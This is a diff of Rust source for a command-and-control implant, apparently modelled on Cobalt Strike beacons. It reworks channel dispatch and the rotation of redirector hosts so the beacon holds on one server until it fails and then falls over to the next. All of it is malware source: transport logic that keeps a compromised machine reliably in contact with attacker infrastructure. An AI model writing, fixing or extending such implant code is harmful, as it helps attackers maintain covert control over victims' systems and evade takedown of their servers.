@@ -246,8 +246,9 @@ impl ChannelCtx {
 /// response frame (or `None` = channel failed).
 ///
 /// This is THE unified transport call. `beacon_loop` calls this instead of
-/// `transport::channel_post_frame`. Each channel variant dispatches to its
-/// module's `send_recv()`.
+/// the old `transport::channel_post_frame` (deleted — dead parallel enum,
+/// implant-beacon-5). Each channel variant dispatches to its module's
+/// `send_recv()`.
 ///
 /// Channels not yet implemented (spec-2~6) return `None` and leave a
 /// diagnostic marker via `entry::diag_mark()`.
@@ -309,32 +310,19 @@ pub fn next_fallback(current: Channel) -> Option<Channel> {
 // Host rotation (spec-7) — CS 4.10-style redirector rotation with fail-hold
 // ══════════════════════════════════════════════════════════════════════════════
 
-/// Current index into the rotation host list. Advanced on each beacon cycle
-/// (round-robin) or on failure (skip to next). CS 4.10 "hold" semantics:
-/// a failed host is skipped, not permanently removed — it's retried after
-/// the full list is cycled.
+/// Current index into the rotation host list. CS 4.10 "hold" semantics: the
+/// beacon HOLDS on the current host until it fails, then `advance_rotation_host`
+/// skips it (retried only after a full cycle wraps around). The index is
+/// advanced ONLY on failure — never on selection — so a single failure moves
+/// exactly one host forward (implant-channels-5: the old code advanced on
+/// selection AND on failure, skipping healthy hosts / re-hammering dead ones).
 static ROTATION_IDX: core::sync::atomic::AtomicUsize = core::sync::atomic::AtomicUsize::new(0);
-
-/// Parse the comma-separated `rotation_hosts` config string into a fixed-size
-/// array of byte slices. Returns the number of valid hosts found (0 = none).
-/// No allocation — slices point directly into the input string's memory
-/// (which is `'static` because it lives in the leaked config plaintext).
-pub fn parse_rotation_hosts(csv: &str) -> usize {
-    // This is used at the https channel level; here we just expose a helper
-    // that the https module calls to select the current host.
-    csv.split(|c| c == ',' || c == ' ')
-        .filter(|s| !s.is_empty())
-        .count()
-}
 
 /// Select which host to connect to this cycle. If `rotation_hosts` is empty,
 /// returns `None` (caller uses `server_host` directly). Otherwise returns a
-/// slice into the rotation list at the current round-robin index, and advances
-/// the index for next cycle.
-///
-/// On failure, the caller should call `advance_rotation_host()` to skip the
-/// current host (CS 4.10 hold semantics: failed hosts are skipped, retried
-/// after a full cycle).
+/// slice into the rotation list at the current index WITHOUT advancing it —
+/// the beacon holds on this host until a call fails, at which point the
+/// caller invokes [`advance_rotation_host`] to skip it (CS 4.10 fail-hold).
 pub fn select_rotation_host<'a>(rotation_hosts: &'a str) -> Option<&'a [u8]> {
     if rotation_hosts.is_empty() {
         return None;
@@ -347,8 +335,6 @@ pub fn select_rotation_host<'a>(rotation_hosts: &'a str) -> Option<&'a [u8]> {
         return None;
     }
     let idx = ROTATION_IDX.load(core::sync::atomic::Ordering::Relaxed) % hosts.len();
-    // Advance for next cycle (round-robin).
-    ROTATION_IDX.fetch_add(1, core::sync::atomic::Ordering::Relaxed);
     Some(hosts[idx].as_bytes())
 }
 
